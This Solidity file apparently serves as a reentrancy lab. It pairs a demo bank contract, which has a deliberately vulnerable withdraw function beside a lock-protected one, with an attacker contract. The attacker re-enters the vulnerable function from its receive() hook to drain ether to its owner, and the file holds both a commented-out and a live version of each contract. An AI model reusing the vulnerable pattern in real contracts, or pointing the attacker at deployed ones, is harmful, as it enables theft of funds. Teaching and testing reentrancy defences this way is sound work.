// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// contract VictimBankVul {

//     /*
//         USER BALANCES
//     */
//     mapping(address => uint256) public balances;

//     /*
//     =====================================================
//     DEPOSIT ETH
//     =====================================================
//     */

//     function deposit() external payable{
//         balances[msg.sender] += msg.value;
//     }

//     /*
//     =====================================================
//     SAFE WITHDRAW
//     =====================================================
//     */

//     function safeWithdraw(uint256 _amount)external{
//         /*
//             CHECK
//         */
//         require( balances[msg.sender] >= _amount, "Insufficient balance" );

//         /*
//             EFFECTS:
//             Update storage FIRST.
//         */
//         balances[msg.sender] -= _amount;

//         /*
//             INTERACTION:
//             External ETH transfer LAST.
//         */
//         (bool success, ) =payable(msg.sender).call{value: _amount }("");

//         require(success,"Transfer failed");
//     }

//     /*
//     =====================================================
//     VULNERABLE WITHDRAW
//     =====================================================

//     BAD ORDER:
//     External call BEFORE state update.
//     */

//     function vulnerableWithdraw(uint256 _amount )external  {
//         /*
//             Validate balance.
//         */
//         require( balances[msg.sender] >= _amount,"Insufficient balance");
//         /*
//             DANGEROUS:
//             External call FIRST.
//         */
//         (bool success, ) =payable(msg.sender).call{value: _amount}("");
//         require(success, "Transfer failed");

//         /*
//             STATE UPDATED TOO LATE.
//         */
//         balances[msg.sender] -= _amount;
//     }

//     /*
//     =====================================================
//     CHECK CONTRACT BALANCE
//     =====================================================
//     */

//     function contractBalance()external view returns (uint256){
//         return address(this).balance;
//     }
// }

// /*
// =========================================================
// MALICIOUS ATTACKER CONTRACT
// =========================================================
// */

// contract MaliciousAttackerVul {
//     /*
//         TARGET VICTIM CONTRACT
//     */
//     VictimBankVul public victim;

//     /*
//         TRACK ATTACK COUNT
//     */
//     uint256 public attackCounter;

//     /*
//         OWNER
//     */
//     address public owner;

//     /*
//         ATTACK LIMIT
//     */
//     uint256 public constant MAX_ATTACKS = 3;

//     /*
//         CONSTRUCTOR
//     */
//     constructor(address _victim)
//     {

//         victim = VictimBankVul(_victim);
//         owner = msg.sender;
//     }

//     /*
//     =====================================================
//     DEPOSIT INTO VICTIM
//     =====================================================
//     */

//     function depositToVictim()  external payable {
//         /*
//             Deposit ETH into victim contract.
//         */
//         victim.deposit{value: msg.value}();
//     }

//     /*
//     =====================================================
//     START ATTACK
//     =====================================================
//     */

//     function attack() external {
//         /*
//             Trigger vulnerable withdraw.
//         */
//         victim.vulnerableWithdraw(1 ether);
//     }

//     /*
//     =====================================================
//     RECEIVE FUNCTION
//     =====================================================

//     Executes automatically
//     when victim sends ETH.
//     */

//     receive() external payable{
//         /*
//             Reentrancy trigger.
//         */
//         if (address(victim).balance >= 1 ether &&attackCounter < MAX_ATTACKS) {
//             attackCounter++;

//             /*
//                 REENTER victim contract.

//                 Balance NOT reduced yet.
//             */
//             victim.vulnerableWithdraw(1 ether);
//         }
//     }

//     /*
//     =====================================================
//     WITHDRAW STOLEN ETH
//     =====================================================
//     */

//     function withdrawLoot()external{
//         require(msg.sender == owner,"Not owner");

//         payable(owner).transfer(
//             address(this).balance);
//     }
// }

contract VictimBank {
    mapping(address => uint256) public balances;

    bool private locked;

    event Deposited(address indexed user, uint256 amount);

    event Withdrawn(address indexed user, uint256 amount);

    event VulnerableWithdrawal(address indexed user, uint256 amount);

    modifier nonReentrant() {
        require(!locked, "Reentrancy detected");

        locked = true;

        _;

        locked = false;
    }

    function deposit() external payable {
        require(msg.value > 0,"No ETH send");

        balances[msg.sender] += msg.value;

        emit Deposited(msg.sender, msg.value);
    }

    function safeWithdraw(uint256 _amount) external nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        balances[msg.sender] -= _amount;

        (bool success, ) = payable(msg.sender).call{value: _amount}("");

        require(success, "Transfer failed");

        emit Withdrawn(msg.sender, _amount);
    }   

    function vulnerableWithdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount,"Insufficient balance");

        (bool success, ) = payable(msg.sender).call{value: _amount}("");

        balances[msg.sender] -= _amount;

        emit VulnerableWithdrawal(msg.sender, _amount);

        require(success, "Transfer failed");
    }

    function protectedWithdraw(uint256 _amount) external nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        balances[msg.sender] -= _amount;

        (bool success, ) = payable(msg.sender).call{value: _amount}("");

        require(success, "Transfer failed");

        emit Withdrawn(msg.sender, _amount);
    }

    function contractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getMyBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    receive() external payable {}
}

contract MaliciousAttacker {
    VictimBank public victim;

    address public owner;

    uint256 public attackerCounter;

    uint256 public constant MAX_ATTACKS = 3;

    constructor(address payable _victim) {
    victim = VictimBank(_victim);
    
    owner = msg.sender;
}


    function depositToVictim() external payable {
        require(msg.value > 0, "Send ETH");

        victim.deposit{value: msg.value}();
    }   

    function attackVulnerable() external {
        attackerCounter = 0;

        victim.vulnerableWithdraw( 1 ether);
    }

    function attackProtected() external {
        attackerCounter = 0;

        victim.protectedWithdraw( 1 ether);
    }

    receive() external payable {
        if(address(victim).balance >= 1 ether && attackerCounter < MAX_ATTACKS)

        {
            attackerCounter++;

            victim.vulnerableWithdraw(1 ether);
        }
    }

    function WithdrawnLoot() external {
        require(msg.sender == owner,"Not the Owner");

        uint256 amount = address(this).balance;

        require(amount > 0,"No ETH");

        payable(owner).transfer(amount);
    }

    function attackerBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
